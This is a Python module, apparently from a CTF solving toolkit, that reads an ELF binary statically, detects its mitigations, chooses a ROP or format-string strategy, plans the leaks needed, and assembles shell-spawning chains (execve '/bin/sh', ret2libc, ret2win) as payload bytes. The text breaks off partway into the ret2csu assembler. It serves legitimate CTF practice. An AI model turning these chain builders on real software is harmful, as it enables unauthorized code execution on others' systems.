#!/usr/bin/env python3
"""Toolkit pwn_autobuild: the stack ROP / format-string AUTOBUILDER (B-025).

The offline payload *builders* already exist beside this file -- `gadget_catalog` (static gadget
finding), `format_string_builder` (%n writes), `stack_migration` (pivots), `pwn_exploit` (the big
chain kit).  What was missing, and what this module is, is the *orchestration* that a human did by
hand at every stack pwn: look at one local binary, RECOGNISE which exploitation strategy its surface
and mitigations allow, WALK the runtime leaks that strategy needs (canary -> PIE base -> libc base),
and ASSEMBLE an alignment-aware ret2win / ret2csu / ret2syscall / ret2libc / format-write chain for
it -- as a plan plus, where every address is already concrete, exact bytes and a pwntools snippet.

  .venv/bin/python -m ctf run toolkits.pwn_autobuild <challenge_dir> [--opt win=0x401234] \
      [--opt buffer_offset=72] [--opt crash=0x6161616c] [--opt strategy=ret2libc] [--opt align=false]
  .venv/bin/python solvers/toolkits/pwn_autobuild.py <elf> [--json]     # a standalone plan dump

SEE ALSO `solvers/toolkits/pwn_exploit.py` (manifest class `executes`, "the big chain kit"), which
also builds ROP chains -- the boundary is deliberate.  This module is a PLAN-ONLY orchestrator: it
recognises the strategy, walks the leaks and emits a never-run plan (bytes / pwntools text) for a
human to run, and it REUSES `gadget_catalog` rather than re-implementing gadget finding.  pwn_exploit
is the engine that actually runs a chain against a live target.  Offline stack-pwn chain planning
belongs here; anything that executes belongs in pwn_exploit.  (The route priorities, 62 here vs 60
for toolkits.pwn_exploit, keep both reachable.)

HARD RULES (CLAUDE.md; docs/CONTRACTS.md section 7; the build task of B-025):
  - PLAN ONLY, NEVER RUN.  This module reads one ELF's bytes STATICALLY (gadget_catalog + an
    optional pyelftools pass) and SERIALISES a plan.  It never executes the binary, never opens a
    socket, never contacts a live target, and never submits.  Running the built payload happens
    later, by the player, only against the squad's assigned target, inside the pwn Docker image.
  - NEVER-GUESS.  An address is used only when it is an exact static fact (an ET_EXEC symbol/gadget)
    or a value the operator supplied; a PIE / libc / canary value is a runtime leak, carried as a
    named placeholder in the chain, never invented.  The flag is never derived from a plan; it is
    returned only when it literally appears in the binary's bytes (a `candidate`).
  - NO SILENT FALLBACK.  A non-ELF, an unsupported architecture, or a missing pyelftools is reported
    by name (an AutobuildError, or a `blocked` / noted SolverResult), never a plausible wrong plan.
  - BOUNDED.  At most MAX_BYTES of one file is read; gadget scanning is gadget_catalog's own cap.

The residual the build plan flags as "partly automatable": recognising a non-format leak oracle (an
echo / read-print loop that returns stack contents) and the ret2csu rbp re-entry is left to a human /
model.  This module recognises a *format-string* oracle statically, assembles the ret2csu register
dance deterministically, and for any other leak emits an explicit `via="unknown"` step with a note.
"""
from __future__ import annotations

import argparse
import dataclasses
import json
import struct
import sys
from dataclasses import dataclass, field
from pathlib import Path
from types import MappingProxyType
from typing import Mapping, Sequence

try:  # flat import on the engine sys.path (solvers/toolkits on it); package form under pytest
    from gadget_catalog import GadgetCatalog, catalog_elf, ELFParseError
except ImportError:  # pragma: no cover - exercised only off the engine sys.path
    from solvers.toolkits.gadget_catalog import GadgetCatalog, catalog_elf, ELFParseError


MAX_BYTES = 64 * 1024 * 1024
# Machine (e_machine) -> the gadget_catalog architecture name.  amd64 / i386 are the only ones with
# a full chain assembler here; the rest are recognised so the plan can decline by name.
_MACHINES = {62: "amd64", 3: "i386", 183: "aarch64", 40: "arm", 8: "mips", 10: "mips", 243: "riscv"}
_SUPPORTED = ("amd64", "i386")

# Imported-function vocabularies (mirrors solvers/toolkits/pwn.py, re-stated to keep this module
# self-contained: pwn.py's basename is shadowed by an installed pwntools `pwn`).
_DANGEROUS = (
    "gets", "system", "execve", "execl", "execlp", "execvp", "popen", "strcpy", "strcat",
    "sprintf", "vsprintf", "scanf", "sscanf", "fscanf", "read", "fread", "memcpy", "alloca",
)
_FORMAT_FUNCS = ("printf", "fprintf", "sprintf", "snprintf", "vprintf", "vfprintf", "vsprintf",
                 "vsnprintf", "dprintf", "syslog")
_OVERFLOW_FUNCS = ("gets", "strcpy", "strcat", "sprintf", "vsprintf", "scanf", "sscanf", "fscanf",
                   "read", "fread", "memcpy", "alloca")
_LIBC_SHELL = ("system", "execve", "execl", "execlp", "execvp", "popen")
import re as _re
_WIN_RX = _re.compile(
    r"(?:^|_)(?:win|backdoor|flag|secret|shell|give|get[_]?flag|admin|magic|target|pwn|vuln|"
    r"notcalled|print[_]?flag|cat[_]?flag|unlock|gift|debug)(?:$|_|\d)", _re.I)

# Program-header types / flags for the mitigation read (no pyelftools needed).
_PT_INTERP, _PT_GNU_STACK, _PT_GNU_RELRO = 3, 0x6474E551, 0x6474E552
_PF_X = 0x1
_DF_BIND_NOW, _DF_1_NOW, _DF_1_PIE = 0x08, 0x00000001, 0x08000000


class AutobuildError(ValueError):
    """The input is not an ELF this autobuilder can plan against (named, never a silent fallback)."""


# --------------------------------------------------------------------------- cyclic (offset finder)

_LOWER = bytes(range(ord("a"), ord("z") + 1))


def _de_bruijn(alphabet: bytes, n: int):
    """Generate a de Bruijn sequence B(k, n) over `alphabet` (one of each length-n window)."""
    k = len(alphabet)
    a = [0] * (k * n)

    def db(t: int, p: int):
        if t > n:
            if n % p == 0:
                for j in range(1, p + 1):
                    yield alphabet[a[j]]
        else:
            a[t] = a[t - p]
            yield from db(t + 1, p)
            for c in range(a[t - p] + 1, k):
                a[t] = c
                yield from db(t + 1, t)

    return db(1, 1)


def cyclic(length: int, *, alphabet: bytes = _LOWER, n: int = 4) -> bytes:
    """A de Bruijn pattern of `length` bytes.  Defaults (lowercase, n=4) match pwntools' `cyclic`,
    so an offset found here maps straight onto a live crash located with pwntools."""
    if isinstance(length, bool) or not isinstance(length, int) or length < 0:
        raise AutobuildError("length must be a non-negative integer")
    if n < 1 or len(alphabet) < 2:
        raise AutobuildError("cyclic needs n>=1 and an alphabet of >=2 symbols")
    out = bytearray()
    for byte in _de_bruijn(alphabet, n):
        out.append(byte)
        if len(out) >= length:
            return bytes(out[:length])
    # The full de Bruijn sequence is shorter than requested: repeat it (pwntools raises; we bound).
    if not out:
        return b""
    while len(out) < length:
        out.extend(out[: length - len(out)])
    return bytes(out[:length])


def cyclic_find(sub: bytes | int, *, alphabet: bytes = _LOWER, n: int = 4, bits: int = 32) -> int:
    """The byte offset at which `sub` first appears in `cyclic(...)`.  `sub` may be the leaked bytes
    or an integer crash value (packed little-endian by `bits`).  Returns -1 when absent."""
    if isinstance(sub, int) and not isinstance(sub, bool):
        width = 8 if bits == 64 else 4
        sub = sub.to_bytes(width, "little")
    if not isinstance(sub, (bytes, bytearray)):
        raise AutobuildError("sub must be bytes or an integer crash value")
    window = bytes(sub[:n])
    if len(window) < n:
        raise AutobuildError(f"need at least {n} bytes to locate an offset")
    full = cyclic(len(alphabet) ** n, alphabet=alphabet, n=n)
    return full.find(window)


# --------------------------------------------------------------------------- static ELF recognition

def _u(data: bytes, fmt: str, off: int):
    return struct.unpack_from(fmt, data, off)


def _header_facts(data: bytes) -> dict:
    """ELF identity + program headers from the header bytes alone (stdlib; no pyelftools)."""
    if data[:4] != b"\x7fELF":
        raise AutobuildError("not an ELF (bad magic)")
    bits = {1: 32, 2: 64}.get(data[4])
    if bits is None:
        raise AutobuildError("not an ELF (bad EI_CLASS)")
    ec = "<" if data[5] == 1 else ">"
    etype, machine = _u(data, ec + "HH", 16)
    arch = _MACHINES.get(machine, f"em_{machine}")
    if bits == 64:
        entry = _u(data, ec + "Q", 24)[0]
        phoff = _u(data, ec + "Q", 32)[0]
        phentsize, phnum = _u(data, ec + "HH", 54)
    else:
        entry = _u(data, ec + "I", 24)[0]
        phoff = _u(data, ec + "I", 28)[0]
        phentsize, phnum = _u(data, ec + "HH", 42)
    segments: list[tuple[int, int]] = []
    for i in range(min(phnum, 256)):
        base = phoff + i * phentsize
        if base + phentsize > len(data) or phentsize < 8:
            break
        p_type = _u(data, ec + "I", base)[0]
        p_flags = _u(data, ec + "I", base + 4)[0] if bits == 64 else _u(data, ec + "I", base + 24)[0]
        segments.append((p_type, p_flags))
    return {
        "bits": bits, "endian": "little" if ec == "<" else "big", "machine": machine, "arch": arch,
        "etype": etype, "entry": entry, "segments": segments,
    }


def _protections(h: dict, names: set[str]) -> dict:
    """Checksec-style tri-state mitigations from the program headers + symbol names only."""
    seg_types = {t for t, _ in h["segments"]}
    gnu_stack = [fl for t, fl in h["segments"] if t == _PT_GNU_STACK]
    if gnu_stack:
        nx = "disabled" if (gnu_stack[0] & _PF_X) else "enabled"
    elif h["segments"]:
        nx = "disabled"
    else:
        nx = "unknown"
    has_interp = _PT_INTERP in seg_types
    if h["etype"] == 3:  # ET_DYN
        pie = "enabled" if (has_interp or h.get("dyn_flags_1", 0) & _DF_1_PIE) else "dso"
    elif h["etype"] == 2:  # ET_EXEC
        pie = "disabled"
    else:
        pie = "unknown"
    if _PT_GNU_RELRO in seg_types:
        bind_now = h.get("bind_now") or (h.get("dyn_flags", 0) & _DF_BIND_NOW) or (h.get("dyn_flags_1", 0) & _DF_1_NOW)
        relro = "full" if bind_now else "partial"
    else:
        relro = "none"
    canary = "enabled" if ("__stack_chk_fail" in names or "__stack_chk_guard" in names) else "disabled"
    fortify = "enabled" if any(n.endswith("_chk") for n in names) else "disabled"
    return {"nx": nx, "pie": pie, "relro": relro, "canary": canary, "fortify": fortify}


def _with_pyelftools(data: bytes, h: dict) -> bool:
    """Add symbols / functions / imports / relocations to `h`.  Returns whether it ran."""
    try:
        from elftools.elf.elffile import ELFFile
        from elftools.elf.sections import SymbolTableSection
        from elftools.elf.relocation import RelocationSection
        from elftools.elf.dynamic import DynamicSection
    except Exception:  # noqa: BLE001 - pyelftools absent: header facts only, noted by the caller
        return False
    try:
        elf = ELFFile(__import__("io").BytesIO(data))
    except Exception:  # noqa: BLE001
        return False
    syms: set[str] = set()
    funcs: list[tuple[str, int]] = []
    imports: set[str] = set()
    sym_values: dict[str, set[int]] = {}
    got_offsets: dict[str, set[int]] = {}
    dyn_flags = dyn_flags_1 = 0
    bind_now = False
    try:
        for sec in elf.iter_sections():
            if isinstance(sec, SymbolTableSection):
                for sym in sec.iter_symbols():
                    name = sym.name or ""
                    if not name:
                        continue
                    try:
                        stype = sym["st_info"]["type"]
                    except Exception:  # noqa: BLE001
                        stype = ""
                    val, shndx = sym["st_value"], sym["st_shndx"]
                    syms.add(name)
                    if stype == "STT_FUNC" and val and shndx != "SHN_UNDEF":
                        funcs.append((name, val))
                    if stype in ("STT_FUNC", "STT_OBJECT") and val and shndx != "SHN_UNDEF":
                        sym_values.setdefault(name, set()).add(val)
                    if shndx == "SHN_UNDEF" and stype in ("STT_FUNC", "STT_NOTYPE"):
                        imports.add(name)
            elif isinstance(sec, DynamicSection):
                for tag in sec.iter_tags():
                    t = tag.entry.d_tag
                    if t == "DT_FLAGS":
                        dyn_flags = tag.entry.d_val
                    elif t == "DT_FLAGS_1":
                        dyn_flags_1 = tag.entry.d_val
                    elif t == "DT_BIND_NOW":
                        bind_now = True
            elif isinstance(sec, RelocationSection):
                symtab = None
                try:
                    link = sec["sh_link"]
                    symtab = elf.get_section(link) if link else None
                except Exception:  # noqa: BLE001
                    symtab = None
                try:
                    for rel in sec.iter_relocations():
                        idx = rel["r_info_sym"]
                        if idx and isinstance(symtab, SymbolTableSection):
                            rname = symtab.get_symbol(idx).name or ""
                            if rname:
                                got_offsets.setdefault(rname, set()).add(rel["r_offset"])
                except Exception:  # noqa: BLE001
                    pass
    except Exception:  # noqa: BLE001 - a truncated table costs its own facts, not the header
        pass
    h["symbols"] = sorted(syms)
    h["functions"] = funcs
    h["imports"] = sorted(imports)
    h["sym_values"] = sym_values
    h["got_offsets"] = got_offsets
    h["dyn_flags"], h["dyn_flags_1"], h["bind_now"] = dyn_flags, dyn_flags_1, bind_now
    return True


def read_elf_facts(data: bytes) -> dict:
    """A static recon report of one ELF: identity, mitigations, symbols and exploit surface.

    Self-contained (no `import pwn`, which an installed pwntools shadows).  Symbol-derived facts
    (functions, win candidates, canary, GOT) need pyelftools; without it `has_symbols` is False and
    `notes` says so -- a named degradation, never a silent one.
    """
    if not isinstance(data, (bytes, bytearray)) or data[:4] != b"\x7fELF" or len(data) < 20:
        raise AutobuildError("not an ELF (bad magic)")
    if len(data) > MAX_BYTES:
        raise AutobuildError(f"ELF exceeds {MAX_BYTES} byte cap")
    h = _header_facts(bytes(data))
    h.setdefault("symbols", [])
    h.setdefault("functions", [])
    h.setdefault("imports", [])
    h.setdefault("sym_values", {})
    h.setdefault("got_offsets", {})
    notes: list[str] = []
    has_symbols = _with_pyelftools(bytes(data), h)
    if not has_symbols:
        notes.append("pyelftools not importable: win-function, canary and GOT recognition unavailable")
    names = set(h["imports"]) | set(h["symbols"])
    h["protections"] = _protections(h, names)
    h["dangerous_imports"] = sorted(n for n in names if n in _DANGEROUS)
    h["format_funcs"] = sorted(n for n in names if any(n == f or n.endswith("_" + f) for f in _FORMAT_FUNCS))
    h["overflow_funcs"] = sorted(n for n in names if n in _OVERFLOW_FUNCS)
    h["libc_shell"] = sorted(n for n in names if n in _LIBC_SHELL)
    h["win_candidates"] = [(n, v) for n, v in h["functions"] if _WIN_RX.search(n)]
    h["has_symbols"] = has_symbols
    h["notes"] = notes
    return h


# --------------------------------------------------------------------------- recognised facts model

@dataclass(frozen=True)
class Mitigations:
    nx: str
    pie: str
    relro: str
    canary: str
    fortify: str

    @property
    def pie_on(self) -> bool:
        return self.pie == "enabled"

    @property
    def canary_on(self) -> bool:
        return self.canary == "enabled"

    @property
    def nx_on(self) -> bool:
        return self.nx == "enabled"

    def as_dict(self) -> dict:
        return dataclasses.asdict(self)


def _single(values: Mapping[str, set]) -> dict[str, int]:
    """name -> the one address, dropping any name that resolves ambiguously (never guessed)."""
    return {name: next(iter(s)) for name, s in values.items() if len(s) == 1}


@dataclass(frozen=True)
class BinaryFacts:
    arch: str
    bits: int
    mitigations: Mitigations
    win_functions: tuple[tuple[str, int], ...] = ()
    overflow_surface: tuple[str, ...] = ()
    format_surface: tuple[str, ...] = ()
    libc_shell: tuple[str, ...] = ()
    gadgets: Mapping[str, int] = field(default_factory=dict)
    symbols: Mapping[str, int] = field(default_factory=dict)
    got: Mapping[str, int] = field(default_factory=dict)
    binsh: int | None = None
    has_symbols: bool = False
    notes: tuple[str, ...] = ()

    def __post_init__(self) -> None:
        object.__setattr__(self, "gadgets", MappingProxyType(dict(self.gadgets)))
        object.__setattr__(self, "symbols", MappingProxyType(dict(self.symbols)))
        object.__setattr__(self, "got", MappingProxyType(dict(self.got)))
        object.__setattr__(self, "win_functions", tuple(self.win_functions))
        object.__setattr__(self, "notes", tuple(self.notes))

    @property
    def supported(self) -> bool:
        return self.arch in _SUPPORTED

    @property
    def has_overflow(self) -> bool:
        return bool(self.overflow_surface)

    @property
    def has_format(self) -> bool:
        return bool(self.format_surface)

    def has_gadgets(self, *semantics: str) -> bool:
        return all(s in self.gadgets for s in semantics)

    def as_dict(self) -> dict:
        return {
            "arch": self.arch, "bits": self.bits, "mitigations": self.mitigations.as_dict(),
            "win_functions": [list(w) for w in self.win_functions],
            "overflow_surface": list(self.overflow_surface), "format_surface": list(self.format_surface),
            "libc_shell": list(self.libc_shell), "gadgets": dict(self.gadgets),
            "symbols": dict(self.symbols), "got": dict(self.got), "binsh": self.binsh,
            "has_symbols": self.has_symbols, "notes": list(self.notes),
        }


def facts_from_report(report: Mapping, catalog: GadgetCatalog | None) -> BinaryFacts:
    """Adapt a `read_elf_facts` report (plus an optional gadget catalog) into `BinaryFacts`.

    Pure: no I/O.  `report` is the dict `read_elf_facts` returns (or a compatible subset), so the
    strategy logic can be tested on hand-built reports without an ELF on disk.
    """
    arch = report.get("arch") or (catalog.architecture if catalog else "unknown")
    bits = int(report.get("bits") or (catalog.bits if catalog else 0))
    prot = report.get("protections") or {}
    mit = Mitigations(
        nx=prot.get("nx", "unknown"), pie=prot.get("pie", "unknown"), relro=prot.get("relro", "unknown"),
        canary=prot.get("canary", "unknown"), fortify=prot.get("fortify", "unknown"),
    )
    gadgets: dict[str, int] = {}
    if catalog is not None:
        for semantic, addrs in catalog.by_semantic().items():
            if addrs:
                gadgets[semantic] = min(addrs)  # lowest exact address, never a guess
    symbols = _single(report.get("sym_values", {}))
    got = _single(report.get("got_offsets", {}))
    binsh = report.get("binsh")
    notes = list(report.get("notes", ()))
    return BinaryFacts(
        arch=arch, bits=bits, mitigations=mit,
        win_functions=tuple(report.get("win_candidates", ())),
        overflow_surface=tuple(report.get("overflow_funcs", ())),
        format_surface=tuple(report.get("format_funcs", ())),
        libc_shell=tuple(report.get("libc_shell", ())),
        gadgets=gadgets, symbols=symbols, got=got, binsh=binsh,
        has_symbols=bool(report.get("has_symbols", False)), notes=notes,
    )


def recognize(source: bytes | str | Path, *, max_bytes: int = MAX_BYTES) -> BinaryFacts:
    """Read one ELF statically and return the recognised `BinaryFacts`.

    Raises `AutobuildError` on a non-ELF or an oversize file -- never a silent pass.
    """
    if isinstance(source, (bytes, bytearray)):
        data = bytes(source)
    else:
        path = Path(source)
        size = path.stat().st_size
        if size > max_bytes:
            raise AutobuildError(f"{path.name} is {size} bytes, over the {max_bytes} cap")
        data = path.read_bytes()
    report = read_elf_facts(data)
    try:
        catalog = catalog_elf(data)
    except ELFParseError:
        catalog = None  # a recognised-but-unsupported gadget arch; strategy declines by name below
    return facts_from_report(report, catalog)


# --------------------------------------------------------------------------- the plan model

@dataclass(frozen=True)
class LeakStep:
    target: str      # "canary" | "pie_base" | "libc_base"
    via: str         # "format-string" | "echo-oracle" | "puts-got" | "unknown"
    reason: str

    def as_dict(self) -> dict:
        return dataclasses.asdict(self)


@dataclass(frozen=True)
class ChainSlot:
    role: str              # "pad" | "canary" | "saved_rbp" | "align" | a gadget semantic | a target
    value: int | None      # a concrete address/immediate, or None when runtime-resolved
    note: str = ""
    placeholder: str = ""   # the leak this slot waits on, when value is None

    def as_dict(self) -> dict:
        return dataclasses.asdict(self)


@dataclass(frozen=True)
class ExploitPlan:
    strategy: str          # ret2win | ret2syscall | ret2csu | ret2libc | format_write | none
    arch: str
    bits: int
    buffer_offset: int | None
    leak_walk: tuple[LeakStep, ...]
    slots: tuple[ChainSlot, ...]
    alignment_fixed: bool
    confidence: str        # concrete | needs-leak | needs-oracle | needs-offset | needs-recon | none
    notes: tuple[str, ...]
    payload: bytes | None = None

    def as_dict(self) -> dict:
        return {
            "strategy": self.strategy, "arch": self.arch, "bits": self.bits,
            "buffer_offset": self.buffer_offset,
            "leak_walk": [s.as_dict() for s in self.leak_walk],
            "slots": [s.as_dict() for s in self.slots],
            "alignment_fixed": self.alignment_fixed, "confidence": self.confidence,
            "notes": list(self.notes),
            "payload_hex": self.payload.hex() if self.payload is not None else None,
            "payload_len": len(self.payload) if self.payload is not None else None,
        }


# amd64 argument gadgets, in call-convention order, and their CSU fallbacks.
_ARG_GADGETS_64 = ("pop rdi ; ret", "pop rsi ; ret", "pop rdx ; ret")
_SYSCALL_SETUP_64 = ("pop rdi ; ret", "pop rsi ; ret", "pop rdx ; ret", "pop rax ; ret")
_CSU_POP = "csu pop rbx rbp r12 r13 r14 r15 ; ret"
_CSU_CALL = "csu call [r12+rbx*8] (r13d,r14,r15)"


def _align_needed(strategy: str, arch: str) -> bool:
    """True when the chain enters glibc code that may `movaps` at a 16-byte boundary.

    amd64 ret2libc / ret2csu / ret2win terminate in a function (system/execve, or a win function
    that classically calls system("/bin/sh")); a ROP `ret` into it leaves rsp 16-misaligned relative
    to the ABI's call-site contract, faulting glibc's `movaps`.  The fix is one extra `ret` gadget.
    ret2syscall enters a raw syscall (no movaps) and i386 has no such requirement -> no align gadget.
    """
    return arch == "amd64" and strategy in ("ret2libc", "ret2csu", "ret2win")


def leak_walk(facts: BinaryFacts, *, strategy: str, needs_libc: bool, have_canary: bool = False) -> tuple[LeakStep, ...]:
    """The ordered runtime leaks `strategy` still needs on `facts`, each tied to a recognised oracle.

    The order is the one an operator follows: canary first (it sits between the buffer and the saved
    return address, so it must be preserved before the overwrite reaches the return address), then
    the PIE base (to use any in-binary address), then the libc base (for ret2libc).  A leak the
    caller already resolved (a supplied canary / libc map) is dropped -- the walk lists only the work
    that remains.
    """
    steps: list[LeakStep] = []
    oracle = "format-string" if facts.has_format else "unknown"
    oracle_reason = (
        "a printf-family call with a possibly user-controlled format (%p/%s leak); confirm the format is attacker-controlled"
        if facts.has_format else
        "no format-string primitive recognised; a human/model must identify the leak (echo/read-print loop)"
    )
    if facts.mitigations.canary_on and not have_canary:
        steps.append(LeakStep("canary", oracle, f"stack canary enabled; leak and replay it -- {oracle_reason}"))
    if facts.mitigations.pie_on:
        steps.append(LeakStep("pie_base", oracle, f"PIE enabled; leak a code/return address to rebase the binary -- {oracle_reason}"))
    if needs_libc:
        libc_via = "format-string" if facts.has_format else ("puts-got" if facts.has_gadgets("pop rdi ; ret") and "puts" in facts.got else "unknown")
        steps.append(LeakStep("libc_base", libc_via,
                              "resolve libc base from a leaked libc symbol (a GOT entry); needed for a ret2libc call into libc"))
    return tuple(steps)


def _pack(values: Sequence[int | None], bits: int) -> bytes | None:
    """Pack a chain's words little-endian, or None when any word is an unresolved placeholder."""
    if any(v is None for v in values):
        return None
    fmt = "<Q" if bits == 64 else "<I"
    return b"".join(struct.pack(fmt, int(v)) for v in values)


def _concrete_payload(buffer_offset: int | None, prefix_words: Sequence[ChainSlot], slots: Sequence[ChainSlot],
                      bits: int, canary: int | None) -> bytes | None:
    """Exact bytes when the offset is known and no slot is an unresolved placeholder."""
    if buffer_offset is None:
        return None
    words: list[int | None] = []
    for slot in list(prefix_words) + list(slots):
        if slot.role == "canary":
            words.append(canary)
        else:
            words.append(slot.value)
    packed = _pack(words, bits)
    if packed is None:
        return None
    return b"A" * buffer_offset + packed


def plan(facts: BinaryFacts, *, buffer_offset: int | None = None, libc: Mapping[str, int] | None = None,
         strategy: str | None = None, win: int | None = None, canary: int | None = None,
         align: bool | None = None) -> ExploitPlan:
    """Choose a strategy for `facts`, walk its leaks, and assemble an alignment-aware chain.

    `buffer_offset` (from `cyclic_find` on a live crash) makes the pad concrete; `win` overrides the
    recognised win function; `libc` maps resolved libc symbol addresses (`system`, `/bin/sh`, ...);
    `canary` is a replay value; `align` forces/forbids the amd64 alignment `ret`.  Nothing is run.
    """
    notes: list[str] = list(facts.notes)
    if not facts.supported:
        return ExploitPlan("none", facts.arch, facts.bits, buffer_offset, (), (), False, "none",
                           tuple(notes + [f"architecture {facts.arch!r} has no stack chain assembler here (amd64/i386 only)"]))

    chosen = strategy or _choose_strategy(facts, win=win)
    if chosen == "format_write":
        return _plan_format_write(facts, buffer_offset, notes)
    if chosen == "none":
        return ExploitPlan("none", facts.arch, facts.bits, buffer_offset, (), (), False, "none",
                           tuple(notes + ["no stack-overflow or format-string surface recognised; nothing to assemble"]))

    # Resolve a libc symbol map for concreteness if supplied.
    libc = dict(libc or {})
    libc_resolved = "system" in libc
    # ret2libc calls straight into libc, so it needs the libc base unless the caller resolved it.
    # ret2csu calls through a GOT slot the loader populates, so an imported function needs no leak.
    needs_libc = (chosen == "ret2libc" and not libc_resolved) or (
        chosen == "ret2csu" and not facts.libc_shell_in_binary() and not libc_resolved)

    if chosen == "ret2win":
        slots, conf, snotes = _assemble_ret2win(facts, win=win, align=align)
    elif chosen == "ret2syscall":
        slots, conf, snotes = _assemble_ret2syscall(facts)
    elif chosen == "ret2csu":
        slots, conf, snotes = _assemble_ret2csu(facts, libc=libc, align=align)
    else:  # ret2libc
        slots, conf, snotes = _assemble_ret2libc(facts, libc=libc, align=align)
    notes.extend(snotes)

    walk = leak_walk(facts, strategy=chosen, needs_libc=needs_libc, have_canary=canary is not None)
    # A chain the plan could otherwise fill is still leak-gated while any leak step remains: an
    # unidentified oracle is harder (needs a human/model) than a leak with a recognised oracle.
    if any(s.via == "unknown" for s in walk):
        conf = "needs-oracle"
    elif walk and conf == "concrete":
        conf = "needs-leak"

    # Symbol-blind recon (no pyelftools): canary / win / GOT recognition is unavailable, so a canary
    # present in the binary reads as 'disabled' here (facts.canary_on is False).  A chain assembled
    # off that blind path must never be certified concrete -- it could silently omit the canary
    # replay and emit a confident-but-wrong payload.  Demote and name the missing tool (rule 6).
    if not facts.has_symbols and conf == "concrete":
        conf = "needs-recon"
        notes.append("pyelftools unavailable: symbol-derived mitigations (stack canary) and win/GOT "
                     "facts are blind, so a concrete chain cannot be certified; install py:elftools "
                     "and re-run (never guessing a canary off the symbol-gated path)")

    aligned = any(s.role == "align" for s in slots)
    prefix = _canary_prefix(facts)
    payload = None
    if conf == "concrete":
        payload = _concrete_payload(buffer_offset, prefix, slots, facts.bits, canary)
        if payload is None and buffer_offset is None:
            conf = "needs-offset"
    all_slots = tuple(prefix) + tuple(slots)
    return ExploitPlan(chosen, facts.arch, facts.bits, buffer_offset, walk, all_slots, aligned, conf,
                       tuple(notes), payload)


def _canary_prefix(facts: BinaryFacts) -> tuple[ChainSlot, ...]:
    """The words between the buffer and the saved return address when a canary must be replayed."""
    if not facts.mitigations.canary_on:
        return ()
    word = "qword" if facts.bits == 64 else "dword"
    saved = [ChainSlot("canary", None, "replay the leaked stack canary", placeholder="canary")]
    # The saved frame pointer sits between the canary and the return address on a standard frame.
    saved.append(ChainSlot("saved_rbp", 0, f"saved {('rbp' if facts.bits == 64 else 'ebp')} ({word} of padding)"))
    return tuple(saved)


def _choose_strategy(facts: BinaryFacts, *, win: int | None) -> str:
    """Recognise the applicable strategy from the overflow/format surface, win function and gadgets."""
    if facts.has_overflow:
        if win is not None or facts.win_functions:
            return "ret2win"
        if facts.arch == "amd64":
            if facts.has_gadgets(*_SYSCALL_SETUP_64, "syscall ; ret") or facts.has_gadgets(*_SYSCALL_SETUP_64, "syscall"):
                return "ret2syscall"
            # Need to control rdi/rsi/rdx but lack direct pop gadgets -> the CSU universal gadgets.
            if not facts.has_gadgets(*_ARG_GADGETS_64) and facts.has_gadgets(_CSU_POP, _CSU_CALL):
                return "ret2csu"
            return "ret2libc"
        # i386: syscall via int 0x80 if the setup gadgets exist, else ret2libc.
        if facts.has_gadgets("pop eax ; ret", "pop ebx ; ret") and (facts.has_gadgets("int 0x80 ; ret") or facts.has_gadgets("int 0x80")):
            return "ret2syscall"
        return "ret2libc"
    if facts.has_format:
        return "format_write"
    return "none"


def _g(facts: BinaryFacts, semantic: str) -> int | None:
    return facts.gadgets.get(semantic)


def _assemble_ret2win(facts: BinaryFacts, *, win: int | None, align: bool | None):
    notes: list[str] = []
    win_addr = win
    if win_addr is None and facts.win_functions:
        name, win_addr = facts.win_functions[0]
        notes.append(f"win function recognised: {name} @ {win_addr:#x}"
                     + ("" if len(facts.win_functions) == 1 else f" (and {len(facts.win_functions) - 1} more candidate(s))"))
    slots: list[ChainSlot] = []
    use_align = _align_needed("ret2win", facts.arch) if align is None else (align and facts.arch == "amd64")
    if use_align:
        ret = _g(facts, "ret")
        slots.append(ChainSlot("align", ret, "16-byte stack alignment for a win function that may call glibc (movaps)"))
        if ret is None:
            notes.append("no bare `ret` gadget found for alignment; drop the align slot if the stack is already aligned")
    slots.append(ChainSlot("win", win_addr, "jump to the win / backdoor function", placeholder="" if win_addr is not None else "win_addr"))
    if win_addr is None:
        return tuple(slots), "needs-offset", notes + ["no win function in symbols; pass --opt win=0xADDR"]
    if facts.mitigations.pie_on:
        return tuple(slots), "needs-leak", notes + ["PIE: the win address is a file offset; add the leaked base"]
    conf = "concrete" if not any(s.value is None for s in slots) else "needs-leak"
    return tuple(slots), conf, notes


def _assemble_ret2syscall(facts: BinaryFacts):
    notes: list[str] = []
    if facts.arch == "i386":
        slots = [
            ChainSlot("pop eax ; ret", _g(facts, "pop eax ; ret"), "eax = 0xb (execve)"),
            ChainSlot("imm:eax", 0xB, "SYS_execve"),
            ChainSlot("pop ebx ; ret", _g(facts, "pop ebx ; ret"), "ebx = &\"/bin/sh\""),
            ChainSlot("arg:/bin/sh", facts.binsh, "\"/bin/sh\" address", placeholder="" if facts.binsh else "binsh"),
            ChainSlot("pop ecx ; ret", _g(facts, "pop ecx ; ret"), "ecx = 0"),
            ChainSlot("imm:ecx", 0, "argv = NULL"),
            ChainSlot("pop edx ; ret", _g(facts, "pop edx ; ret"), "edx = 0"),
            ChainSlot("imm:edx", 0, "envp = NULL"),
            ChainSlot("int 0x80 ; ret", _g(facts, "int 0x80 ; ret") or _g(facts, "int 0x80"), "execve(\"/bin/sh\", 0, 0)"),
        ]
    else:
        slots = [
            ChainSlot("pop rdi ; ret", _g(facts, "pop rdi ; ret"), "rdi = &\"/bin/sh\""),
            ChainSlot("arg:/bin/sh", facts.binsh, "\"/bin/sh\" address", placeholder="" if facts.binsh else "binsh"),
            ChainSlot("pop rsi ; ret", _g(facts, "pop rsi ; ret"), "rsi = 0 (argv)"),
            ChainSlot("imm:rsi", 0, "argv = NULL"),
            ChainSlot("pop rdx ; ret", _g(facts, "pop rdx ; ret"), "rdx = 0 (envp)"),
            ChainSlot("imm:rdx", 0, "envp = NULL"),
            ChainSlot("pop rax ; ret", _g(facts, "pop rax ; ret"), "rax = 59 (execve)"),
            ChainSlot("imm:rax", 59, "SYS_execve"),
            ChainSlot("syscall ; ret", _g(facts, "syscall ; ret") or _g(facts, "syscall"), "execve(\"/bin/sh\", 0, 0)"),
        ]
    if facts.binsh is None:
        notes.append("no \"/bin/sh\" string located; stage it into a writable section first (pass --opt binsh=0xADDR), or use ret2libc")
    conf = "concrete" if not any(s.value is None for s in slots) else "needs-offset"
    if conf != "concrete":
        notes.append("some syscall-setup gadgets or the /bin/sh address are unresolved; see the slot list")
    return tuple(slots), conf, notes


def _assemble_ret2csu(facts: BinaryFacts, *, libc: Mapping[str, int], align: bool | None):
    """The __libc_csu_init universal gadgets: load rdi/rsi/rdx then call a pointer, via the rbp=1
